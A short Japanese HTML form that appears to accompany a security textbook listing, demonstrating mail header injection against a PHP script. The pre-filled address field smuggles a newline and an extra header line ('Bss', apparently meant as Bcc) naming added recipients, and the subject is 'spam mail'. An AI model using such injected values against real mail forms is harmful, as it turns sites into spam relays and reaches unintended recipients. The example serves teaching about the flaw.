<html>
    <head>
        <title>リスト10.6に投稿するページ</title>
        <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
    </head>
    <body>
        <form action="mail_header_injection.php" method="post">
            件名<input type="text" name="subject" value="spam mail" /> <br />
            メール<textarea name="form">foo@example.com
Bss: bar@example.com, buz@example.com</textarea><br />
            内容<textarea name="body">メールヘッダインジェクションです。
Bssで意図しない相手にメールを送信しています。
</textarea><br />
            <input type="submit" value="メール送信" />
        </form>
    </body>
</html>
